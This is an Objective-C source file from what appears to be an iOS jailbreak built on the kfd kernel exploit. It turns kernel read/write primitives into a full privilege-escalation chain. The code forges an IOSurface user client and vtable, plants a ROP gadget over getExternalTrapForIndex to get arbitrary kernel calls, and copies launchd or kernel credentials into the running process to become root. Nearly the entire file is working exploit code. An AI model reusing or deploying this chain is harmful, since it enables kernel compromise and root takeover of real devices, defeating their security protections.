//
//  libkfd.m
//  kfd
//
//  Created by Serena on 29/08/2023.
//  

#import <Foundation/Foundation.h>
#include "libkfd.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}


void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

u64 kopen(u64 puaf_pages, puaf_method puaf_method, kread_method kread_method, kwrite_method kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_IOSurface);
    assert(kwrite_method <= kwrite_IOSurface);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);
    
    kernel_slide = kfd->info.kernel.kernel_slide;
    current_proc = kfd->info.kernel.current_proc;

    timer_end();
    return (u64)(kfd);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

void _kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    //kread(kaddr, uaddr, size);
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void _kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size) {
    //kwrite(kaddr, uaddr, size);
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

uint32_t _kread32(u64 kfd, uint64_t where) {
    uint32_t out;
    _kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}


uint64_t _kread64(u64 kfd, uint64_t where) {
    uint64_t out;
    _kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

void _kwrite32(u64 kfd, uint64_t where, uint32_t what)
{
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = _kread32(kfd, where+4);
    _kwrite(kfd, &_buf, where, sizeof(u64));
}

void _kwrite64(u64 kfd, uint64_t where, uint64_t what)
{
    u64 _buf[1] = {};
    _buf[0] = what;
    _kwrite(kfd, &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kfd, uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = _kread32(kfd, curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

size_t kwritebuf(uint64_t kfd, uint64_t where, const void *p, size_t size) {
    size_t remainder = size % 8;
    if (remainder == 0)
        remainder = 8;
    size_t tmpSz = size + (8 - remainder);
    if (size == 0)
        tmpSz = 0;

    uint64_t *dstBuf = (uint64_t *)p;
    size_t alignedSize = (size & ~0b111);

    for (int i = 0; i < alignedSize; i+=8){
        _kwrite64(kfd, where + i, dstBuf[i/8]);
    }
    if (size > alignedSize) {
        uint64_t val = _kread64(kfd, where + alignedSize);
        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
        _kwrite64(kfd, where + alignedSize, val);
    }
    return size;
}

uint64_t find_port(u64 kfd, mach_port_name_t port, u64 task_addr){
    uint64_t itk_space;
    if (@available(iOS 15.2, *)) {
        itk_space = _kread64(kfd, task_addr + 0x308);
    } else {
        itk_space = _kread64(kfd, task_addr + 0x330);
    }
    uint64_t is_table = _kread64(kfd, itk_space + 0x20);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = _kread64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

void show_port(u64 kfd, mach_port_name_t port, u64 task_addr, u64 orig){
    uint64_t itk_space;
    if (@available(iOS 15.2, *)) {
        itk_space = _kread64(kfd, task_addr + 0x308);
    } else {
        itk_space = _kread64(kfd, task_addr + 0x330);
    }
    uint64_t is_table = _kread64(kfd, itk_space + 0x20);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    _kwrite64(kfd, is_table + (port_index * sizeof_ipc_entry_t), orig);
    return;
}

uint64_t hide_port(u64 kfd, mach_port_name_t port, u64 task_addr) {
    uint64_t itk_space;
    if (@available(iOS 15.2, *)) {
        itk_space = _kread64(kfd, task_addr + 0x308);
    } else {
        itk_space = _kread64(kfd, task_addr + 0x330);
    }
    uint64_t is_table = _kread64(kfd, itk_space + 0x20);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = _kread64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
    _kwrite64(kfd, is_table + (port_index * sizeof_ipc_entry_t), 0);
    return port_addr;
}


// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
uint64_t dirty_kalloc(u64 kfd, size_t size) {
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t begin = kfd_struct->info.kernel.kernel_proc;
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = _kread32(kfd, addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                break;
            }
        }
        if (found) {
            printf("[+] dirty_kalloc: 0x%llx\n", addr);
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        printf("[-] failed to find free space in kernel\n");
        exit(EXIT_FAILURE);
    }
    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = _kread64(kcall_kfd, fake_client+0x40);
    uint64_t offx28 = _kread64(kcall_kfd, fake_client+0x48);
    _kwrite64(kcall_kfd, fake_client+0x40, x0);
    _kwrite64(kcall_kfd, fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    _kwrite64(kcall_kfd, fake_client+0x40, offx20);
    _kwrite64(kcall_kfd, fake_client+0x48, offx28);
    return returnval;
}

void kcall6_nox0_raw_init(uint64_t fakeclient) {
    printf("inited a raw kcallread"); sleep(1);
    _kwrite64(kcall_kfd, fakeclient+0x40, 0x565656);
    _kwrite64(kcall_kfd, fakeclient+0x48, kcall6_nox0_offset + kernel_slide);
}

uint64_t kcall_6_nox0(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
    uint64_t returnval = IOConnectTrap6(krw_client, (uint64_t)x0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), addr);
    return returnval;
}

uint64_t init_kcall_remote(u64 kfd, u64 task_addr, mach_port_t user_client) {
    
    puts("Beginning remote kcall init");
    uint64_t uc_port = find_port(kfd, user_client, task_addr);
    printf("Found port: 0x%llx\n", uc_port); usleep(500);
    uint64_t uc_addr;
    if (@available(iOS 15.2, *)) {
        uc_addr = _kread64(kfd, uc_port + off_ipc_port_ip_kobject_152);
    } else {
        uc_addr = _kread64(kfd, uc_port + off_ipc_port_ip_kobject_151);
    }
    printf("Found addr: 0x%llx\n", uc_addr); usleep(500);
    uint64_t uc_vtab = _kread64(kfd, uc_addr);
    printf("Found vtab: 0x%llx\n", uc_vtab); usleep(500);
    uint64_t fake_vtable = kalloc(0x1000);
    printf("Created fake_vtable at %016llx\n", fake_vtable); usleep(500);
    for (int i = 0; i < 0x200; i++) {
        _kwrite64(kfd, fake_vtable+i*8, _kread64(kfd, uc_vtab+i*8));
    }
    printf("Copied some of the vtable over\n"); usleep(500);
    uint64_t fake_client = kalloc(0x2000);
    printf("Created fake_client at %016llx\n", fake_client);
    for (int i = 0; i < 0x200; i++) {
        _kwrite64(kfd, fake_client+i*8, _kread64(kfd, uc_addr+i*8));
    }
    printf("Copied the user client over\n");
    _kwrite64(kfd, fake_client, fake_vtable);
    if (@available(iOS 15.2, *)) {
        _kwrite64(kfd, uc_port + off_ipc_port_ip_kobject_152, fake_client);
    } else {
        _kwrite64(kfd, uc_port + off_ipc_port_ip_kobject_151, fake_client);
    }
    _kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
    return fake_client;
}

void init_kcall(u64 kfd, u64 task_addr) {
    kcall_kfd = kfd;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = find_port(kfd, user_client, task_addr);
    printf("Found port: 0x%llx\n", uc_port); usleep(500);
    uint64_t uc_addr;
    if (@available(iOS 15.2, *)) {
        uc_addr = _kread64(kfd, uc_port + off_ipc_port_ip_kobject_152);
    } else {
        uc_addr = _kread64(kfd, uc_port + off_ipc_port_ip_kobject_151);
    }
    printf("Found addr: 0x%llx\n", uc_addr); usleep(500);
    uint64_t uc_vtab = _kread64(kfd, uc_addr);
    printf("Found vtab: 0x%llx\n", uc_vtab); usleep(500);
    uint64_t fake_vtable = dirty_kalloc(kfd, 0x1000);
    printf("Created fake_vtable at %016llx\n", fake_vtable); usleep(500);
    for (int i = 0; i < 0x200; i++) {
        _kwrite64(kfd, fake_vtable+i*8, _kread64(kfd, uc_vtab+i*8));
    }
    printf("Copied some of the vtable over\n"); usleep(500);
    fake_client = dirty_kalloc(kfd, 0x2000);
    printf("Created fake_client at %016llx\n", fake_client);
    for (int i = 0; i < 0x200; i++) {
        _kwrite64(kfd, fake_client+i*8, _kread64(kfd, uc_addr+i*8));
    }
    printf("Copied the user client over\n");
    _kwrite64(kfd, fake_client, fake_vtable);
    if (@available(iOS 15.2, *)) {
        _kwrite64(kfd, uc_port + off_ipc_port_ip_kobject_152, fake_client);
    } else {
        _kwrite64(kfd, uc_port + off_ipc_port_ip_kobject_151, fake_client);
    }
    _kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
}

uint64_t proc_of_pid(u64 kfd, pid_t pid)
{
    uint64_t proc = ((struct kfd*)kfd)->info.kernel.kernel_proc;
    while (proc != 0) {
        uint64_t pidptr = proc + 0x68;
        uint32_t pid2 = _kread32(kfd, pidptr);
        if(pid2 == pid) {
            printf("GOT IT\n");
            return proc;
        }
        proc = _kread64(kfd, proc + 0x8);
    }
    return 0;
}

void getRoot(u64 kfd, uint64_t proc_addr)
{
    struct kfd* kfd_struct = (struct kfd*)kfd;
    
    if (@available(iOS 15.2, *)) {
        
        uint64_t self_ro = _kread64(kfd, proc_addr + 0x20);
        printf("self_ro @ 0x%llx\n", self_ro);
        uint64_t self_ucred = _kread64(kfd, self_ro + 0x20);
        printf("ucred @ 0x%llx\n", self_ucred);
        printf("test_uid = %d\n", getuid());

        uint64_t kernproc = proc_of_pid(kfd, 1);
        printf("kern proc @ %llx\n", kernproc);
        uint64_t kern_ro = _kread64(kfd, kernproc + 0x20);
        printf("kern_ro @ 0x%llx\n", kern_ro);
        uint64_t kern_ucred = _kread64(kfd, kern_ro + 0x20);
        printf("kern_ucred @ 0x%llx\n", kern_ucred);

        // use proc_set_ucred to set kernel ucred.
        
        kcall(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
    } else {
        uint64_t proc_addr = kfd_struct->info.kernel.current_proc;
        uint64_t self_ucred = _kread64(kfd, proc_addr + 0xD8);
        printf("ucred @ 0x%llx\n", self_ucred);
        printf("test_uid = %d\n", getuid());

        uint64_t kernproc = proc_of_pid(kfd, 1);
        
        printf("launchd proc @ %llx\n", kernproc);
        uint64_t kern_ucred = _kread64(kfd, kernproc + 0xD8);
        printf("launchd ucred @ 0x%llx\n", kern_ucred);

        _kwrite64(kfd, proc_addr + 0xD8, kern_ucred);
        printf("zero'd out uids\n");
    }
    setuid(0);
    setuid(0);
    printf("getuid: %d\n", getuid());
}

typedef u64 (*find_offset_func)(struct kfd *kfd);

u64 find_or_set_offset(char *name, find_offset_func func, struct kfd *kfd, bool allowCache) {
    if (allowCache) {
        u64 num = [[NSUserDefaults standardUserDefaults] integerForKey:@(name)];
        
        if (num) {
            NSLog(@"found offset %s in userdefaults", name);
            return num + kfd->info.kernel.kernel_slide;
        }
    }
    
    NSLog(@"couldn't find offset %s in defaults, calling func", name);
    u64 off = func(kfd);
    if (off && allowCache) {
        [[NSUserDefaults standardUserDefaults] setInteger:(off - kfd->info.kernel.kernel_slide) forKey:@(name)];
    }
    
    return off;
}

void init_offsets(struct kfd *kfd) {
    add_x0_x0_0x40_ret_func = find_or_set_offset("add_x0_x0_0x40_ret_func", find_add_x0_x0_0x40_ret, kfd, true);
    // caching ldr_w0_x2_x1 causes trouble, and makes it double
    // (caching ldr_w0_x2_x1 and sending it to jbd causes some xpc issues...)
    ldr_w0_x2_x1 = find_or_set_offset("ldr_w0_x2_x1", find_ldr_w0_x2_x1_ret, kfd, false);
    str_w1_x2 = find_or_set_offset("str_w1_x2", find_str_w1_x2_ret, kfd, true);
    
    if (ldr_w0_x2_x1 == 0) {
        printf("this kernel has no ldr w0, [x2, x1], using fallback with ldr w0, [x1]\n");
        ldr_w0_x2_x1 = find_or_set_offset("ldr_w0_x1_ret", find_ldr_w0_x1_ret, kfd, true);
    }
}

void stage2(u64 kfd)
{
    struct kfd* kfd_struct = (struct kfd*)kfd;
    printf("patchfinding!\n");
    init_kernel(kfd_struct);
    
    init_offsets(kfd_struct);
    
    printf("ldr w0, [x2, x1] / ldr w0, [x1] 0x%llX", ldr_w0_x2_x1);
    printf("str w1, [x2] 0x%llX", str_w1_x2);
    assert(add_x0_x0_0x40_ret_func != 0);
    if (@available(iOS 15.2, *)) {
        proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
        printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
        assert(proc_set_ucred_func != 0);
    } else {
        printf("no proc_set_ucred_func, below 15.2\n");
    }
    printf("patchfinding complete!\n");
    pid_t pid = getpid();
    printf("pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(kfd, getpid());
    printf("proc_addr @ 0x%llx\n", proc_addr); sleep(1);
    printf("init_kcall!\n");
    init_kcall(kfd, _kread64(kfd, proc_addr + 0x10));
    printf("getRoot!\n");
    getRoot(kfd, proc_addr);
}

#define HEXDUMP_COLS 16

void hexdump(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset */
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("0x%06x: ", i);
                }
 
                /* print hex data */
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump */
                {
                        printf("   ");
                }
                
                /* print ASCII dump */
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing */
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char */
                                {
                                        putchar(0xFF & ((char*)mem)[j]);
                                }
                                else /* other char */
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}
